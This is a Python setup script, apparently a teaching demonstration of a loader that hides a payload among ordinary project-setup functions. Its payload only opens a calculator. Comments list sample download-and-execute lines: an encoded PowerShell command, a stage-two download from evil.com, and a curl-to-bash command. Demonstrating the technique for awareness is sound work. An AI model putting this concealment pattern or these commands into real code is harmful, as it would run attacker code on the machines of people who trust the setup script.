#!/usr/bin/env python3
"""
=============================================================================
VARIANT 3: LOADER — Legitimate-Looking Setup Script with Embedded Payload
=============================================================================

This script demonstrates how an attacker can hide a payload inside a
legitimate-looking project setup file. The script performs real setup
operations (creating directories, checking dependencies) to appear normal,
while executing the payload as a side effect.

In a real attack, the payload section would be:
  - A download cradle fetching second-stage malware
  - A reverse shell connection
  - An infostealer collecting credentials, SSH keys, browser data
  - A cryptocurrency wallet drainer

PAYLOAD: calc.exe (Windows Calculator) — harmless proof of concept.

=============================================================================
"""

import os
import sys
import platform
import subprocess


def check_python_version():
    """Verify Python version meets project requirements."""
    major, minor = sys.version_info[:2]
    if major < 3 or (major == 3 and minor < 8):
        print(f"[!] Python 3.8+ required, found {major}.{minor}")
        return False
    print(f"[+] Python {major}.{minor} — OK")
    return True


def create_project_directories():
    """Create standard project directory structure."""
    dirs = ["build", "dist", "logs", ".cache"]
    for d in dirs:
        os.makedirs(d, exist_ok=True)
    print(f"[+] Created project directories: {', '.join(dirs)}")


def check_dependencies():
    """Check if required packages are available."""
    required = ["json", "os", "sys"]  # Only stdlib — won't fail
    missing = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)

    if missing:
        print(f"[!] Missing packages: {', '.join(missing)}")
        print("    Run: pip install -r requirements.txt")
        return False
    print("[+] All dependencies satisfied")
    return True


def initialize_config():
    """Generate default configuration file."""
    config_path = os.path.join(".cache", "project.conf")
    if not os.path.exists(config_path):
        with open(config_path, "w") as f:
            f.write("# Auto-generated project configuration\n")
            f.write(f"platform={platform.system()}\n")
            f.write(f"python={sys.version_info.major}.{sys.version_info.minor}\n")
        print(f"[+] Configuration written to {config_path}")
    else:
        print("[+] Configuration already exists")


# =============================================================================
# PAYLOAD SECTION
# =============================================================================
# In a real attack, this function would contain the malicious logic.
# It is intentionally buried among legitimate setup functions to avoid
# detection during casual code review.
#
# Common real-world payloads:
#   subprocess.Popen(["powershell", "-EncodedCommand", "<base64>"])
#   urllib.request.urlretrieve("https://evil.com/stage2.exe", "update.exe")
#   os.system("curl https://evil.com/shell.sh | bash")
# =============================================================================

def platform_specific_setup():
    """Configure platform-specific build toolchain."""
    system = platform.system()
    print(f"[+] Configuring for {system}...")

    if system == "Windows":
        # PAYLOAD: Opens calculator as proof of concept.
        # In a real attack, this would be the malicious command.
        subprocess.Popen(
            ["calc.exe"],
            creationflags=subprocess.CREATE_NO_WINDOW  # Hide the subprocess window
        )
    elif system == "Darwin":
        subprocess.Popen(["open", "-a", "Calculator"])
    elif system == "Linux":
        subprocess.Popen(["xcalc"], stderr=subprocess.DEVNULL)

    print("[+] Platform toolchain configured")


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

def main():
    print("=" * 60)
    print("  Project Environment Setup")
    print("=" * 60)
    print()

    check_python_version()
    create_project_directories()
    check_dependencies()
    initialize_config()
    platform_specific_setup()  # <-- Payload executes here

    print()
    print("[+] Setup complete! You can now run the project.")
    print("=" * 60)


if __name__ == "__main__":
    main()
